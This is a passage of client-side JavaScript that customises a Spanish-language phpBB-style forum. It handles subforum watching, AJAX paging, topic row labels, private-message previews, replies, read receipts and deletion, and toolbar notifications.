                        ops.box(j, '<a>Ver el contenido del primer post del tema:' + f + '</a>', function () {
                            ops.prefijos();
                            ops.temas.main.imgauto();
                            ops.temas.main.panda();
                            ops.preventDoubleClick(c, false)
                        });
                    });
                });
            },
            setImg: function () {
                var a, p = init.g('.PreviewImg'),
                    s = window.localStorage;
                init.myarray(p, function (i) {
                    var t, e = init.g('.topictitle', init.closest(i, 'li'))[0].href;
                    if ('undefined' != typeof e) {
                        t = e.match(/\d+/g)[1];
                        a = s.getItem('mini_por_' + t);
                        a ? (i.style.backgroundImage = 'url(' + a + ')') : ops.preXMTL(e, t, i);
                    }
                })
            },
            vigilar: function () {
                var a, b, c, f, g, h,
                    p = init.g('.watch')[0],
                    e = init.g('a', p)[0];
                a = e.href;
                b = init.contiene(a, '?unwatch=forum');
                c = init.contiene(a, '?watch=forum');
                f = b ? ops.lang.unwatchBTNs : c && ops.lang.watchBTNs;
                if (b || c) {
                    e.innerHTML = f;
                    e.addEventListener('click', function (event) {
                        event.preventDefault();
                        ops.subs.follow(this, event)
                    })
                }
            },
            follow: function (c, event) {
                var a = c.href,
                    b = init.contiene(a, '?watch=forum'),
                    g = init.contiene(a, '?unwatch=forum'),
                    d = b ? ' dejo de vigilar el subforo: ' : g && ' esta vigilando el subforo: ',
                    e = b ? window.location.href + '?unwatch=forum' : g && window.location.href + '?watch=forum',
                    h = b ? ops.lang.unwatchBTNs : g && ops.lang.watchBTNs;
                ops.preventDoubleClick(c, !0, !1, !1, event, '#000', undefined, function () {
                    ops.xmlhRequest('confirm=1', a, function () {
                        ops.preventDoubleClick(c, false);
                        c.href = e;
                        c.innerHTML = h;
                        ops.actividadFeed(ops.mi_nombre + d + '[url=' + window.location.href + ']' + document.title + '[/url]', 'Historial');
                    });
                });
            },
            page: {
                set: function () {
                    var a, b, e = init.g('a');
                    init.myarray(e, function (i) {
                        a = /f(\d+)p(\d+)|f(\d+)/g.test(i.href);
                        b = /(\d+)/g.test(i.innerHTML);
                        a && b && i.addEventListener('click', function (event) {
                            event.preventDefault();
                            init.g('#list_box').style.opacity = '0';
                            ops.subs.page.reload(this.href);
                            ops.back(ops.backAdd());
                        }, false)

                    })

                },
                reload: function (c) {
                    var a, b, d, o,
                        f = '.bg_none',
                        g = '.pag_ajax',
                        e = init.g(g);
                    ops.xmlhRequest('', c, function (x) {
                        o = x.responseXML;
                        a = init.g(f)[0];
                        b = init.g(f, o)[0];
                        d = init.g(g, o);
                        init.replaceHtml(b, a, function () {
                            init.replaceHtml(d[0], e[0]);
                            init.replaceHtml(d[1], e[1]);
                            ops.subs.pre();
                        })
                    });
                }
            },
            pre: function () {
                init.cachedScript('https://allphpbb31.com/js/tooltips_sub.js', function () {
                    ops.subs.formatRows();

                });
                ops.subs.usersviews();
                ops.logout && ops.subs.vigilar();
                ops.subs.setmessage();
                ops.subs.previewImg();
                ops.setMarcasLeidos();
                ops.subs.setImg();
                ops.subs.open()
            },
            open: function () {
                var a = init.g('#list_box'),
                    b = init.g('.topic-actions'),
                    topic = init.g('.topic-actions')[1];
                init.fadeIn(a, 300, undefined, function () {
                    init.myarray(b, function (i) {
                        init.fadeIn(i, 300, 'inline-block');
                    });
                    ops.subs.page.set();
                    ops.backClose()
                })
            },
            estoy: function (c) {
                return ts.indexOf('/f' + c) >= 0
            },
            setmessage: function () {
                var li, html, s, a = init.g('#wrap'),
                    h = init.g('.row2')[0],
                    b = ops.subs.estoy(15),
                    c = ops.subs.estoy(14),
                    d = ops.subs.estoy(10),
                    f = ops.subs.estoy(12),
                    g = ops.subs.estoy(13),
                    e = /^\/f(4|5|6|34|7|11|12)(p[0-9]+)?-/.test(ts);
                (c || f || g) && a.classList.add('support');
                if (b || c || d || e || f || g) {
                    html = e ? ops.html.codigos : b ? ops.html.beta : g ? ops.html.staff : c ? ops.html.support : d && ops.html.evaluaciones;
                    li = init.create('li', {
                            childs: [{
                                tag: 'div',
                                class: 'guestMessage' + (c ? ' support' : ''),
                                html: html
                            }]
                        }),
                        init.move(h, li, 'before');
                }
            },

            favs: function (c, d) {
                var b = c.href;
                ops.xmlhRequest('', b, function (e) {
                    $.boxes('alert', 'Se añadio correctamente: ' + d + ' a tu lista de favoritos')
                });
            },
            formatRows: function () {
                var t = init.g('#list_box'),
                    i = init.g('.row', t);
                init.myarray(i, function (t) {
                    var i = init.g('.type', t),
                        e = init.g('.topictitle', t),
                        n = init.g('.ok', t),
                        l = t.className,
                        o = init.create('span', {
                            class: 'prefijo naglob',
                            text: 'Anuncio global'

                        }),
                        a = init.create('span', {
                            class: 'prefijo nota',
                            text: 'Sticky'

                        }),
                        s = init.create('span', {
                            'class': 'prefijo anuncio',
                            text: 'Anuncio'

                        }),
                        c = init.create('span', {
                            class: 'prefijo votaciones',
                            text: 'Votaciones'

                        }),
                        r = init.create('span', {
                            class: 'prefijo ok',
                            text: '✔'
                        }),
                        p = function (t, i) {
                            init.move(e[0], i, 'prepend', function () {
                                init.borrar(t)
                            })
                        },
                        b = init.contiene(l, 'global'),
                        d = init.contiene(l, 'nota'),
                        f = init.contiene(l, 'anuncio'),
                        h = init.contiene(t, '[ Sondeos ]'),
                        m = init.contiene(n[0], 'Has posteado'),
                        g = b ? o : d ? a : f && s;
                    (b || d || f) && p(i[0], g);
                    i.length && '' === i[0].innerHTML && init.borrar(i[0]);
                    n.length && '' === n[0].innerHTML ? init.borrar(n[0]) : m && p(n[0], r);
                    h && (p(i[0], c), t.classList.add('sondeos'));
                    ops.logout && ops.subs.postrow(e[0])
                })
            },
            postrow: function (t) {
                var e = init.closest(t, '.icon'),
                    i = t.getAttribute('views'),
                    n = init.g('.google', e)[0],
                    o = init.g('.favblog', e)[0],
                    regex = /<(span)(?:.)[^>]+>((?:.)[^>]+>)?/gi,
                    html = t.innerHTML,
                    a = html.match(regex) ? html.replace(regex, '').replace(/(?:\s)\s/g, '') : t.textContent,
                    s = t.href.match(/[^t]\d+/g)[1],
                    r = init.g('.prefijo', t),
                    c = escape('site:https://opensourcephpbb3.foroactivo.com/ ' + a),
                    b = r.length >= 1 ? r[1] : t,
                    f = init.create('span', {
                        'class': 'prefijo popular',
                        text: 'popular',
                        attributes: {
                            title: 'Leído ' + i + ' veces'
                        }
                    }),
                    g = r.length ? 'after' : 'prepend';
                i >= 5e3 && init.move(b, f, g);
                o.setAttribute('title', 'Añadir a favoritos: ' + a);
                n.setAttribute('title', 'buscar en google: ' + a);
                e.innerHTML = e.innerHTML.replace('%escape%', c).replace('%favs%', s)
            },
            cambiarHref: function () {
                var e = init.g('.i_post'),
                    i = e.length;
                while (i--) {
                    if (/\/post\?f=3&mode=newtopic/g.test(e[i].href)) {
                        e[i].href = '/post?f=14&mode=newtopic';
                    }
                }
            },
        },
        //seccion mp
        mp: {
            first: function () {
                isPMlist && (ops.mp.rows.formato(), ops.mp.pagAjax(ops.mp.id('inbox').tag, init.g('.pmlist')[0].offsetHeigh));
                isMPNew || isMPpost && ops.mp.init();
                isMPRead && ops.mp.setup();

            },
            init: function () {
                var h = init.g('.dl_titulo')[0],
                    i = init.g('#main'),
                    j = init.g('#ze-editor');
                j.classList.add('pm-mode');
                i.classList.add('mp_new');
                h.style.cssText = 'display:block;width:100%';
            },
            setup: function () {
                var i, a = init.g('#main'),
                    b = init.g('.profile-icons'),
                    c = init.create('span', {
                        class: 'mpquote',
                        style: {
                            fontSize: '10px',
                        },
                        text: 'Citar'
                    }),
                    d = init.g('.postprofile')[0].firstChild.children[2].textContent,
                    e = init.g('.buttons'),
                    f = init.g('li', init.g('#privmsgs-menu')),
                    g = init.g('a', b[0])[0];
                a.classList.add('mp_fix', 'mp_read');
                init.replaceHtml(c, g);
                !ops.soy_adm && ops.mp.rows.noVer();
                e[0].firstChild.firstChild.textContent = 'Responder MP a ' + d;
                init.myarray(f, function (i) {
                    i.classList.remove('active');
                    init.g('a', i)[0].removeAttribute('onclick');
                });

            },
            reload: function () {
                var URL = init.g('a', init.g('.mp1')[0])[0];
                ops.mp.tabs.init('inbox', URL)
            },
            rows: {
                vacio: {
                    setup: function (row) {
                        var a = init.g('.bg_none')[0],
                            c = init.g('.row', a),
                            b = init.g('#no_mensajes'),
                            e = c.length && init.contiene(c[0], 'No tienes mensajes en esta carpeta'),
                            d = init.create('li', {
                                class: 'empty',
                                childs: [{
                                    tag: 'dl',
                                    class: 'icon',
                                    childs: [{
                                        tag: 'dt',
                                        childs: [{
                                            tag: 'strong',
                                            attributes: {
                                                id: 'no_mensajes',
                                            },
                                            childs: [{
                                                tag: 'i',
                                                class: 'fa fa-envelope',
                                            }, {
                                                tag: 'span',
                                                html: '&nbsp;&nbsp;No tienes mensajes en esta carpeta'
                                            }]
                                        }]
                                    }]
                                }]
                            }),
                            f = b || e ? a.firstChild : a,
                            g = b || e ? 'replaceWith' : 'append';
                        (!c.length || b) && init.move(f, d, g, function () {
                            init.fadeIn(row, '500', undefined, function () {
                                init.show(init.g('#privmsgs-menu'))
                            });
                        })

                    },
                    init: function (c) {
                        var b = init.g('#no_mensajes'),
                            d = init.g('.mprow');
                        if (b || !d.length) {
                            ops.mp.rows.vacio.setup(c);
                        }
                    },
                },
                formato: function () {
                    var t, w, y, d, o, n, r, q, e, z, bb, tt, cc, ff,
                        a = document.forms.privmsg_list,
                        b = init.g('#privmsgs-menu'),
                        c = init.g('.row'),
                        z = init.g('.active'),
                        colorA = 'background:rgb(249, 240, 175) !important',
                        colorB = 'background:#febbbb!important';
                    init.contiene(a, 'topictitle') ? (init.myarray(c, function (i) {
                        w = init.g('.topictitle', i);
                        d = w.length && w[0].href.match(/(\d+)$/g)[0];
                        o = function () {
                            var a = init.g('.from_mp', i);
                            return {
                                href: a.length ? a[0].firstChild.href : undefined,
                                name: a[0].textContent
                            }
                        };
                        r = init.g('.a_reply', i)[0];
                        q = init.g('.a_quote', i)[0];
                        e = init.g('.avamps', i)[0];
                        bb = init.contiene(i.className, 'newpost');
                        tt = init.contiene(i, 'mensaje automático');
                        cc = init.contiene(i, 'contactar');
                        ff = 'ops.mp.preview(this);ops.mp.leer(this);return false';
                        if ('undefined' != typeof o().href) {
                            t = init.uid(o().href);
                            y = e.firstChild;
                            y.src = ops.getAva(t);
                            ops.imgBroken(y, ops.html.img_ava_default);
                        }
                        if (z.length && ops.mp.id('inbox').is && 'undefined' != typeof o) {
                            r.innerHTML = ops.mp.rows.nameReplace(r.innerHTML, o().name);
                            r.name = o().name;
                            q.innerHTML = ops.mp.rows.nameReplace(q.innerHTML, o().name);
                            q.name = o().name;
                            r.href = ops.mp.rows.idReplace(r.href, d);
                            q.href = ops.mp.rows.idReplace(q.href, d);
                        } else {
                            r && init.borrar(r);
                            q && init.borrar(q);
                        }!tt && !cc && ops.mp.id('inbox').is && bb && w[0].setAttribute('onclick', ff);
                        bb && tt && (init.addClass(i, 'mp_automatico'), i.style.cssText = colorA);
                        cc && (init.addClass(i, 'contacto'), i.style.cssText = colorB)
                        init.fadeIn(a, 500, undefined, function () {
                            init.show(b)
                        })
                    })) : ops.mp.rows.vacio.init(a);


                },
                idReplace: function (target, id) {
                    return target.replace(/%id%/g, id)
                },
                nameReplace: function (target, name) {
                    return target.replace(/%name%/g, name);
                },
                noVer: function () {
                    var a = document.querySelectorAll('.post .content');
                    init.myarray(a, function (i) {
                        if (init.contiene(i, 'Pass:')) {
                            init.borrar(init.closest(i, '.post'))
                        }
                    })
                },
                noLeer: function () {
                    var b, title, a = init.g('.row');
                    init.myarray(a, function (i) {
                        b = init.g('em', i),
                            title = init.g('.topictitle', i)[0].textContent.toUpperCase();
                        !ops.soy_adm && title == "MENSAJE AUTOMÁTICO" && init.borrar(i);
                        b.length && (b[0].textContent = 'Enviado a:');
                    });
                    if (!a.length && !init.g('#no_mensajes')) {
                        ops.mp.rows.vacio.init(document.forms.privmsg_list)
                    }
                }
            },
            tabs: {
                init: function (d, c) {
                    ops.mp.tabs.load(init.g('.pmlist')[0].offsetHeight);
                    var b = init.g('.active')[0],
                        e = c.href;

                    b.classList.remove('active');
                    c.parentNode.classList.add('active');
                    ops.mp.tabs.Get(d, e)
                },
                load: function (H) {
                    var a = init.create('fragment', {
                            childs: [{
                                tag: 'div',
                                style: {
                                    width: '100%',
                                    height: H + 'px',
                                    textAlign: 'center',
                                    margin: ' 0 auto',
                                    display: 'table',
                                    minHeight: '58px',
                                    background: 'rgb(238, 238, 238)'
                                }
                            }]
                        }),
                        b = init.g('.pmlist')[0];
                    if (mp && /\mode=read/.test(window.location) === false) {
                        ops.indice.spin(a, '#000', '40px', '30px auto', ' Cargando...');
                        init.replaceHtml(a, b)
                    }
                },
                preGet: function () {
                    ops.mp.rows.vacio.init(document.forms.privmsg_list);
                    ops.confirm();
                    ops.prefijos();
                    isPMlist && ops.mp.rows.formato();

                },
                Get: function (d, c) {
                    ops.xmlhRequest('', c, function (x) {
                        var t, H, l,
                            e = x.responseXML,
                            a = init.g('.pmlist')[0],
                            b = init.create('fragment', {
                                childs: [{
                                    tag: 'i',
                                    class: 'fas fa-save',
                                    attributes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'span',
                                    text: ' MP guardado de'
                                }]
                            }),
                            j = init.g('.row'),
                            f = init.g('#pag_main'),
                            g = init.g('#pag_main', e),
                            h = init.g('.pmlist', e)[0],
                            array = function (j, clase) {
                                init.myarray(j, function (i) {
                                    init.removeClass(i, 'newpost');
                                    init.addClass(i, clase);
                                    if (clase == 'savebox') {
                                        l = init.g('em', i)[0];
                                        init.replaceHtml(b, l);
                                        init.hide(init.g('.save_pm', i)[0])
                                    }
                                });
                            };
                        init.replaceHtml(h, a);
                        init.replaceHtml(g, f);
                        ops.mp.tabs.preGet();
                        switch (d) {
                            case 'sentbox':
                            case 'outbox':
                                ops.mp.rows.noLeer();
                                array(j, d);
                                break;
                            case 'savebox':
                                array(j, d);
                                break;
                        };
                        H = a.offsetHeight;
                        setTimeout(function(){ops.mp.pagAjax(d, H)},500);
                        ops.mp.scroll(H);
                    })
                },
            },
            scroll: function (H) {
                H > 250 && ops.scroll.top(init.g('.subject')[0], 300);
            },
            id: function (b) {
                var a = init.g('.active')[0],
                    c = a.lastChild;
                return {
                    active: c,
                    is: undefined != b ? c.id === b : undefined,
                    tag: c.id,
                    href: c.href
                }
            },
            pagAjax: function (g, H) {
                var t, a = init.g('a');
                init.myarray(a, function (i) {
                    if (/privmsg\?folder=(\w+)&start=(\d+)/g.test(i.href)) {
                        i.addEventListener('click', function (b) {
                            b.preventDefault();
                            b.stopPropagation();
                            ops.mp.tabs.load(H);
                            ops.mp.tabs.Get(g, this.href);
                        }, false);
                    }
                })
            },
            preview: function (c) {
                try {
                    var i, div, clonePost, cloneHeader, subject, o, p, d, f, j, pb,
                        n = init.closest(c, 'li'),
                        a = init.g('#notif_activepm'),
                        b = document.body,
                        u = c.href.match(/(\d+)$/g)[0],
                        l = init.g('#directLink'),
                        m = init.g('.ajaxPM_link'),
                        g = init.g('#ajaxPM'),
                        s = init.g('.active')[0].lastChild,
                        z = init.g('.post-icon')[0],
                        prev = init.g('#preview-mp'),
                        username = init.g('.from_mp', n)[0].textContent,
                        onclick = 'ops.mp.sendNewMP(\'E\',this);return false';
                    ops.xmlhRequest('', c.href, function (x) {
                        o = x.responseXML;
                        pb = init.g('.postbody', o)[0];
                        subject = init.g('.post-subjet', o)[0].textContent;
                        g.innerHTML = init.BB.parse(pb.innerHTML);
                        ops.mp.id('outbox').is ? (init.move(init.g('#i_icon_quote'), init.create('span', {
                            class: 'mp_edit',
                            text: 'Editar',
                            attributes: {
                                alt: username
                            }
                        }), 'replaceWith'), init.g('.mp_edit')[0].parentNode.setAttribute('onclick', onclick)) : ops.mp.id('inbox').is && n.classList.remove('newpost', 'mp_automatico');
                        init.myarray(m, function (i) {
                            if (i.textContent.match(/(mp a|mp de|MPs con)\s(.*)/g)) {
                                var user = i.textContent.match(/(mp a|mp de|MPs con)\s(.*)/)[2];
                                init.elem(i, {
                                    textContent: i.textContent.replace(user, username),
                                    name: username,
                                    href: i.href.replace(/(&p=)(.*)/, '&p=' + u)
                                })
                            }
                        });
                        div = init.create('div', {
                            childs: [{
                                tag: 'div',
                                class: 'post'
                            }]
                        });
                        clonePost = g.cloneNode(true);
                        cloneHeader = init.g('#ajaxPM_header').parentNode.cloneNode(true);
                        init.move(div.firstChild, clonePost, 'append');
                        ops.box(div, subject, function () {
                            init.move(init.g('#topicPreviewing'), cloneHeader, 'prepend');
                        });
                    })
                } catch (e) {
                    console.error(e)
                }
            },
            sendNewMP: function (d, c) {
                try {
                    var e, html, texto, a = c.name,
                        b = c.href,
                        f = init.g('.topictitle', init.closest(c, 'li')),
                        i = init.g('#topicPreview-container');
                    switch (d) {
                        case 'Q':
                            e = f.length ? f[0].textContent : init.g('.post-subjet')[0].textContent;
                            i.classList.add('mp_fast_n');
                            i.classList.remove('mp_fast_q', 'mp_fast_edit');
                            ops.xmlhRequest('', b, function (x) {
                                var w = x.responseXML,
                                    forms = w.forms.post;
                                init.g('#pm-message').value = forms ? forms.message.value : 'ocurrio un error';
                                init.g('#pm-subject').value = forms ? forms.subject.value : 'ocurrio un error';
                            });
                            texto = ops.html.mp_quote_text + a;
                            break;
                        case 'R':
                            e = f.length ? 'Re:' + f[0].textContent : 'Re:' + init.g('.post-subjet')[0].textContent;
                            i.classList.remove('mp_fast_n', 'mp_fast_edit');
                            i.classList.add('mp_fast_q');
                            texto = ops.html.mp_send_text + a;
                            break;
                        case 'E':
                            a = c.firstChild.getAttribute('alt');
                            e = init.closest(c, 'div').firstChild.textContent;
                            i.classList.remove('mp_fast_n', 'mp_fast_q');
                            i.classList.add('mp_fast_edit');
                            ops.xmlhRequest('', b, function (x) {
                                var w = x.responseXML
                                init.g('#pm-message').value = w.forms.post ? init.g('#editor-textarea', w).value : 'ocurrio un error';
                            });
                            texto = ops.html.mp_edit_text + a;
                            break
                    }
                    html = init.create('div', {
                        childs: [{
                            tag: 'div',
                            attributes: {
                                id: 'pm-modal',
                            },
                            class: 'main main-content frm',
                            childs: [{
                                tag: 'div',
                                class: 'main-head',
                                childs: [{
                                    tag: 'div',
                                    attributes: {
                                        id: 'pm-title'
                                    },
                                    class: 'page-title',
                                    style: {
                                        float: 'right'
                                    }
                                }]
                            }, {
                                tag: 'form',
                                attributes: {
                                    action: '/privmsg',
                                    method: 'post',
                                    name: 'post',
                                    enctype: 'multipart/form-data'
                                },
                                style: {
                                    width: 'auto'
                                },
                                childs: [{
                                    tag: 'fieldset',
                                    class: 'pm-body',
                                    style: {
                                        marginLeft: '6px',
                                       
                                        padding: '12px',
                                        
                                    },
                                    childs: [{
                                        tag: 'dl',
                                        class: 'pm-row',
                                        childs: [{
                                            tag: 'dt',
                                            childs: [{
                                                tag: 'label',
                                                attributes: {
                                                    for: 'pm-subject',
                                                },
                                                style: {
                                                    color: 'rgb(255, 255, 255)'
                                                }
                                            }]
                                        }, {
                                            tag: 'dd',
                                            childs: [{
                                                tag: 'input',
                                                class: 'inputbox',
                                                attributes: {
                                                    id: 'pm-subject',
                                                    name: 'subject',
                                                    type: 'text',
                                                    placeholder: 'Coloca el título de tu mensaje',
                                                    value: e
                                                }
                                            }]
                                        }]
                                    }, {
                                        tag: 'dl',
                                        class: 'pm-row',
                                        childs: [{
                                            tag: 'dt',
                                            childs: [{
                                                tag: 'label',
                                                attributes: {
                                                    for: 'pm-message',
                                                },
                                                style: {
                                                    color: 'rgb(255, 255, 255)'
                                                }
                                            }]
                                        }, {
                                            tag: 'dd',
                                            childs: [{
                                                tag: 'textarea',
                                                class: 'inputbox',
                                                attributes: {
                                                    id: 'pm-message',
                                                    name: 'message',
                                                    type: 'text',
                                                    placeholder: ops.mi_nombre + ' escribe tu mensaje...',
                                                    value: e,
                                                },
                                                style: {
                                                    height: '180px'
                                                }
                                            }]
                                        }]
                                    }]
                                }, {
                                    tag: 'fieldset',
                                    class: 'pm-buttons frm-set',
                                    childs: [{
                                        tag: 'dl',
                                        class: 'frm-buttons',
                                        childs: [{
                                            tag: 'dt'
                                        }, {
                                            tag: 'dd',
                                            childs: [{
                                                tag: 'input',
                                                class: 'sendmp',
                                                attributes: {
                                                    onclick: 'ops.mp.enviar(this,\'' + a + '\',\'' + d + '\',\'' + b + '\', event);return false',
                                                    name: 'post',
                                                    type: 'submit',
                                                    value: 'Enviar'
                                                }
                                            }, {
                                                tag: 'a',
                                                class: 'advanced_mp',
                                                attributes: {
                                                    href: b
                                                },
                                                text: 'Ir al editor completo',
                                            }]
                                        }]
                                    }]
                                }]
                            }, {
                                tag: 'span',
                                class: 'corners-bottom',
                                childs: [{
                                    tag: 'span'
                                }]
                            }]
                        }, {
                            tag: 'div',
                            attributes: {
                                id: 'pm-backdrop'
                            }
                        }]
                    });
                    ops.box(html, texto);
                } catch (e) {
                    console.error(e)
                }
            },
            enviar: function (a, b, d, c, event) {
                var subject = init.g('#pm-subject').value,
                    message = init.g('#pm-message').value,
                    username = b;
                ops.preventDoubleClick(a, true, false, false, event, undefined, undefined, function () {
                    ops.i_a(d, c, subject, message, username, function () {
                        ops.backClose('#topicPreview-container');
                        setTimeout(function () {
                            ops.toolbar.notify.go(ops.mi_nombre + ': tu mensaje a ' + b + ' se envió correctamente', null, 'check', 'fas fa-check-double')
                        }, 500);
                    });
                });
            },
            leer: function (c) {
                var a = init.g('.from_mp', c.parentNode.parentNode)[0].textContent,
                    b = c.textContent,
                    d = ops.mi_nombre,
                    data = {
                        subject: '[Mensaje automático]: ' + ops.mi_nombre + ' leyó tu MP',
                        message: ops.mi_nombre + ' leyó tu mensaje privado:[b][quote]' + b + '[/quote][/b]',
                        username: a,
                        mode: 'post',
                        folder: 'inbox',
                        post: '1'
                    }
                ops.xmlhRequest(data, '/privmsg', function () {});
            },
            borrartodo: function () {
                if (init.g('.mprow').length) {
                    var a = ops.mp.id().href,
                        tag = ops.mp.id().tag,
                        b = document.forms.privmsg_list,
                        c = init.g('.delete_all')[0],
                        d = init.g('.pmlist')[0],
                        h = ops.mp.id().active;
                    init.elem(c, {
                        value: 'Borrando...',
                        onclick: 'return false'
                    });
                    ops.xmlhRequest(ops.serialize(b) + '&tid=' + isTid + '&confirm=1&deleteall=1', a, function () {
                        ops.mp.tabs.init(tag, h);
                        init.elem(c, {
                            value: 'Borrar Todo',
                            onclick: 'ops.mp.borrartodo(this);return false'
                        });
                    })
                } else {
                    ops.toolbar.notify.go('No hay mensajes que eleminar', null, 'alert', 'fa-exclamation')
                }
            },
            borrarseleccion: function (f) {
                var a = document.forms.privmsg_list,
                    c = ops.mp.id().active,
                    b = ops.mp.id().href,
                    e = ops.mp.id().tag;
                ops.xmlhRequest(ops.serialize(a) + '&confirm=1&delete=true', b, function () {
                    ops.mp.tabs.init(e, c);

                })


            },
        },
        toolbar: {
            init: function () {
                var a = init.g('#fa_share'),
                    b = init.g('#fa_search'),
                    c = init.g('#fa_service'),
                    d = init.g('#fa_usermenu'),
                    e = init.g('#fa_magnifier'),
                    f = init.g('#fa_textarea'),
                    h = init.g('#fa_right');
                ops.toolbar.fix(d, a, c);
                ops.toolbar.search(f);
                ops.toolbar.avatar();
                ops.toolbar.notificaciones.cambiarTextos();
                ops.logout && ops.toolbar.favoritos.setup();
                b.style.cssText = 'display:inline-block!important';
                h.style.cssText = 'display:inline-block!important';
                init.move(e, init.create('i', {
                    class: 'fas fa-search-plus',
                    style: {
                        color: '#fff',
                        fontSize: '16px',
                        marginLeft: '4px',
                        lineHeight: '1.4'
                    }
                }), 'append');
            },
            fix: function (d, a, c) {
                var g = [a, c],
                    e = ops.mi_nombre + ' ¿que tienes en mente?',
                    b = d && d.children[2].firstChild.children[1],
                    f = init.g('#fa_search'),
                    j = c && init.create('div', {
                        attributes: {
                            id: 'fa_status'
                        },
                        childs: [{
                            tag: 'input',
                            attributes: {
                                id: 'ops_status_input',
                                type: 'text',
                                placeholder: e
                            }
                        }, {
                            tag: 'span',
                            class: 'ops_status-button',
                            attributes: {
                                onclick: 'ops.status_box(this, event)'
                            },
                            childs: [{
                                tag: 'i',
                                attributes: {
                                    'aria-hidden': 'true'
                                },
                                class: 'fas fa-edit',
                            }, {
                                tag: 'span',
                                text: ' Compartir',
                            }]
                        }]
                    });
                ops.logout && (init.move(f, j, 'after'), d && init.borrar(b));
                g && init.myarray(g, function (t) {
                    init.borrar(t)
                });
            },
            search: function (f) {
                ops.placeholder(f, 'Busqueda inteligente...');
                f.style.cssText = 'text-indent:3px!important';
                f.addEventListener('focus', function () {
                    ops.placeholder(this, 'Busca en Open Source usando Ajax');
                    this.style.width = '300px'
                    ops.smarthSearch();
                    this.addEventListener('blur', function () {
                        ops.placeholder(this, 'Busqueda inteligente...');
                        this.style.width = '200px'
                    }, false);
                }, false);
            },
            avatar: function () {
                var a, avatar,
                    b = init.g('#fa_right');
                if (b && ops.logout) {
                    avatar = ops.miavatarSRC;
                    a = init.create('img', {
                        attributes: {
                            src: avatar
                        },
                        class: 'ava_inicio',
                        style: {
                            width: '25px',
                            height: '25px',
                            borderRadius: '100%',
                            float: 'left',
                            marginRight: '10px',
                            marginTop: '1px'
                        },
                    });
                    init.move(b, a, 'prepend')
                }
            },
            notificaciones: {
                cero: {
                    setup: function (n) {
                        var list = init.g('#notif_list'),
                            c = init.g('.content', list),
                            a = init.g('#cero_notif'),
                            b = init.g('.eliminar'),
                            i = c.length ? true : false;
                        !a && i == false && n == 0 || b.length ? ops.toolbar.notificaciones.cero.show() : a && i == true && !b.length && init.borrar(a);
                    },
                    show: function () {
                        var f = init.g('.see_all')[0],
                            a = init.create('div', {
                                attributes: {
                                    id: 'cero_notif',
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-bell-slash',
                                }, {
                                    tag: 'span',
                                    class: 'cero_notif_texto',
                                    text: 'No hay notificaciones'
                                }],
                            });
                        init.move(f, a, 'prepend', function (x, y) {
                            f.classList.add('cero_not');
                            init.fadeIn(y, 500);
                            Toolbar._alignNotifications();
                        });
                    },
                },
                cambiarTextos: function () {
                    var e = compileNotif;
                    Toolbar.compileNotif = compileNotif = function (t) {
                       var c, d, f, b, a, g, h, i, o = e(t);
                        if (o) {
                            a = t.text.type;
                            b = a == 7 || a == 8;
                            c = b && t.text.post.topic_name.replace(/-/g, ' ');
                            i = t.time;
                            f = t.text.from.id;
                            // hacer mayuscula la primera
                            h = b && c.substring(0, 1);
                            l = b && c.replace(h, h.toUpperCase());
                            o = b ? o.replace(/\(topic_name\)/, l) : o;
                           o = '<div class="avanotif">'+
                              '<span class="user-ava"  type="' + a + '">' +
                               '<img src="' + ops.getAva(f) + '"/>'+
                               '</span>'+
                               '</div>' +
                               '<span class="text_notif_live">'+
                               '<b class="timeNotif">'+
                               '<i class="fas fa-clock"></i>&nbsp;'+ 
                                i + '</b><br/>&nbsp;<span class="contenido">' + 
                                o +'</span></span>';
                         }
                        return o
                    }
                    
                },
                clase: function () {
                    var d, b, e, c,
                        n = init.g('#notif_list'),
                        li = init.g('.contentText', n);
                    init.myarray(li, function (i) {
                        c = init.closest(i, 'li');
                        d = init.g('.user-ava', i);
                        e = d[0].getAttribute('type');
                        b = '0' == e ? 'mp_notif' : '2' == e ? 'frs_notif' : '5' == e ? 'wall_notif' : '7' == e ? 'watch_post' : '8' == e ? 'mencion' : '';
                        b != '' && !c.classList.contains(b) && c.classList.add(b);
                    });
                },
                unread: function (e, t) {
                    var list = init.g('#notif_list'),
                        cero = init.g('#cero_notif'),
                        url = '/profile?mode=editprofile&page_profil=notifications',
                        data = e == 'read' ? '' : 'delete_all=1&tid:=' + isTid,
                        go = e == 'read' ? ' todas las notificaciones se marcaron como leídas' : ': Se eliminaron todas las notificaciones.';
               if(!cero) { ops.xmlhRequest(data, url, function () {
                        var a = init.g('.content', list);
                        init.myarray(a, function (i) {
                            var li = init.closest(i, 'li');
                            e == 'read' ? li.classList.remove('unread') : e == 'delete' && (li.classList.add('eliminar'), init.hide(li));
                        });
                        ops.toolbar.notify.go(ops.mi_nombre + go, null, 'check', 'fas fa-check-double');
                        document.title = ops.titulo_pagina;
                        init.g('#notif_unread').innerHTML = '';
                        pu && ops.perfil.main.contexto(ops.activetab);
                        ops.toolbar.returntitulo();
                        ops.toolbar.notificaciones.cero.setup(0);
                        }) }else{  ops.toolbar.notify.go(ops.mi_nombre + ' no hay notificaciones', null, 'alert', 'fas fa-exclamation-circle');}
                },
                plus: function () {
                    var e = init.create('fragment', {
                            childs: [{
                                tag: 'div',
                                attributes: {
                                    id: 'see_all_plus'
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-check-square',
                                    attibutes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'a',
                                    text: 'Ver más',
                                    attributes: {
                                        href: '/profile?mode=editprofile&page_profil=notifications'
                                    }
                                }, {
                                    tag: 'i',
                                    class: 'fa fa-check-square',
                                    attibutes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'a',
                                    class: 'read_notif_',
                                    attributes: {
                                        href: '#',
                                        onclick: 'ops.toolbar.notificaciones.unread(\'read\',this);return false',
                                    },
                                    text: 'Marcar leídas'
                                }, {
                                    tag: 'i',
                                    class: 'fa fa-trash',
                                    attibutes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'a',
                                    class: 'delete_notif_plus',
                                    attributes: {
                                        href: '#',
                                        onclick: 'ops.toolbar.notificaciones.unread(\'delete\',this);return false',
                                    },
                                    text: 'Borrar'
                                }, {
                                    tag: 'i',
                                    class: 'fa fa-volume-off',
                                    attibutes: {
                                        'aria-hidden': 'true'
                                    }
                                }, {
                                    tag: 'span',
                                    attributes: {
                                        id: 'noSoundText'
                                    },
                                    text: 'Sin sonido '
                                }, {
